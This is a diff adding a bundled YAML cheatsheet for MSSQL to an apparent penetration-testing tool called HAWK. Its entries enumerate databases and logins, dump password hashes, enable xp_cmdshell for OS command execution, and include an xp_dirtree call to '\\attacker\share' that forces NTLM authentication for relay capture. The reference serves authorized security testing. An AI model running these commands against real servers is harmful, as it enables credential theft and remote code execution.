@@ -1,0 +1,42 @@
+# HAWK DB cheatsheet — bundled default.
+# Override or extend at ~/.config/hawk/db_profiles/mssql.yaml
+# Schema doc: hawkC/profiles/db_profiles/README.md
+---
+name: mssql
+title: MSSQL / SQL Server
+aliases:
+- ms-sql-s
+- ms-sql-m
+intro: Run with impacket-mssqlclient.  xp_cmdshell + sysadmin role = RCE.  enable_xp_cmdshell
+  is the standard escalation chain.
+commands:
+- cmd: SELECT @@VERSION;
+  desc: Server version + OS
+- cmd: SELECT name FROM sys.databases;
+  desc: List databases
+- cmd: USE <db>;
+  desc: Switch to a database
+- cmd: SELECT name FROM sys.tables;
+  desc: List tables in current db
+- cmd: SELECT * FROM <table>;
+  desc: Dump a table
+- cmd: SELECT SYSTEM_USER, CURRENT_USER;
+  desc: Logged-in user
+- cmd: SELECT * FROM master.sys.syslogins;
+  desc: List SQL logins
+- cmd: SELECT name, password_hash FROM sys.sql_logins;
+  desc: Dump password hashes (sysadmin only, 2005+)
+- cmd: EXEC sp_helpdb;
+  desc: Detailed DB info
+- cmd: EXEC sp_who;
+  desc: Active connections
+- cmd: EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+  desc: Unlock advanced options (prerequisite)
+- cmd: EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+  desc: Enable xp_cmdshell
+- cmd: EXEC xp_cmdshell 'whoami';
+  desc: Execute OS command (RCE — sysadmin only)
+- cmd: EXEC xp_dirtree '\\attacker\share', 1, 1;
+  desc: Force NTLM auth to attacker (NTLM relay capture)
+- cmd: exit
+  desc: Exit impacket-mssqlclient
